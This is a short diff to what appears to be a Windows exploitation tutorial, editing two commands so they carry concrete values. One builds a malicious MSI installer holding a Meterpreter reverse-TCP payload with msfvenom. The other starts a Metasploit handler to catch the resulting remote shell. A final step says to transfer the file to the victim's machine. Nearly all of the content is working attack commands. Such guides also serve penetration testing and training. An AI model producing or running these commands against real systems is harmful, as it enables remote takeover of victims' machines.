@@ -238,7 +238,7 @@ msiexec /q /n /uninstall NCVInstaller.msi
 1) To perform exploitation with [msfvenom](https://github.com/rapid7/metasploit-framework), you can use the following command to create a malicious MSI file:
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=<port> EXITFUNC=thread -f msi > nickvourd.msi
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=1234 EXITFUNC=thread -f msi > nickvourd.msi
 ```
 
 Outcome:
@@ -248,7 +248,7 @@ Outcome:
 2) Configure Metasploit's handler according to your selected MSI payload preferences:
 
 ```
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip_address>; set LPORT <port>; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 1234; set EXITFUNC thread; set ExitOnSession false; exploit -j -z"
 ```
 
 3) Transfer the malicious MSI file to the victim's machine.
